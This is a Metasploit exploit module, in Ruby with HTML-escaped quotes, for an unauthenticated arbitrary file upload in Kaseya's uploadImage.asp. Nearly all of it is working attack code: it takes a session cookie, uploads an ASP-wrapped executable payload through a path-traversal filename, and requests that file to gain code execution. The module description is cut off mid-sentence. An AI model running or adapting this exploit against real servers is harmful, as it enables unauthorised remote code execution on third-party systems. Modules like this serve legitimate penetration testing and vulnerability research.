# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Kaseya uploadImage Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary file upload vulnerability found in Kaseya versions below
        authentication, leading to arbitrary code execution with IUSR privileges.
      },
      &#039;Author&#039;         =>
        [
          &#039;Thomas Hibbert <thomas.hibbert@security-assessment.com&#039; # Vulnerability discovery and MSF module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;99984&#039;],
          [&#039;BID&#039;, &#039;63782&#039;],
          [&#039;EDB&#039;, &#039;29675&#039;],
          [&#039;URL&#039;, &#039;http://security-assessment.com/files/documents/advisory/Kaseya%20File%20Upload.pdf&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>
        [
          [ &#039;Kaseya KServer / Windows&#039;, {} ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 11 2013&#039;))
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;SystemTab&#039;,&#039;uploadImage.asp&#039;)
    })

    # the vuln was patched by removing uploadImage.asp. if the page is there, calling it without params will return 500, else 404
    unless res and res.code == 500
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    print_status("#{peer} - Getting cookie...")
    res = send_request_cgi({
       &#039;method&#039; => &#039;GET&#039;,
       &#039;uri&#039;    => normalize_uri("SystemTab", "uploadImage.asp")
    })

    unless res and res.code == 500 and res.headers and res.headers.include?(&#039;Set-Cookie&#039;)
      fail_with(Exploit::Failure::Unknown, "#{peer} - Failed to get cookie")
    end

    cookie = res.get_cookies
    @payload_name = "#{rand_text_alpha_lower(8)}.asp"
    exe  = generate_payload_exe
    asp  = Msf::Util::EXE.to_exe_asp(exe)
    post_data = Rex::MIME::Message.new
    post_data.add_part(asp, "application/octet-stream", nil, "form-data; name=\"uploadFile\"; filename=\"#{@payload_name}")
    data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi({
      "method" => "POST",
      "uri"    => normalize_uri("SystemTab", "uploadImage.asp"),
      "vars_get" => {
        "filename" => "..\\..\\..\\..\\#{@payload_name}"
      },
      "data"   => data,
      "ctype"  => "multipart/form-data; boundary=#{post_data.bound}",
      "cookie" => cookie
    })

    unless res and res.code == 200
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    register_files_for_cleanup(@payload_name)

    print_status("#{peer} - Executing payload #{@payload_name}")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(@payload_name),
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

